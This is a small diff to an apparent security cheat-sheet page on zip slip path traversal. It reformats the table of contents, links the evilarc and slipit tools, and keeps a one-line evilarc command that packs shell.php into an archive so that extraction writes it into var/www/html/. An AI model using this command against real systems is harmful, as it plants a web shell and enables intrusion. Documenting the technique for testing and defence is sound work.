@@ -4,11 +4,11 @@
 
 ## Summary
 
-- [Detection](#detection)
-- [Tools](#tools)
+* [Detection](#detection)
+* [Tools](#tools)
 * [Exploits](#exploits)
   * [Basic Exploit](#basic-exploit)
-- [Additional Notes](#additional-notes)
+* [Additional Notes](#additional-notes)
 
 ## Detection
 
@@ -16,12 +16,14 @@
 
 ## Tools
 
-- evilarc [https://github.com/ptoomey3/evilarc](https://github.com/ptoomey3/evilarc)
+- [evilarc](https://github.com/ptoomey3/evilarc)
+- [slipit](https://github.com/usdAG/slipit)
 
 ## Exploits
 
 ### Basic Exploit
 
+Using evilarc:
 ```python
 python evilarc.py shell.php -o unix -f shell.zip -p var/www/html/ -d 15
 ```
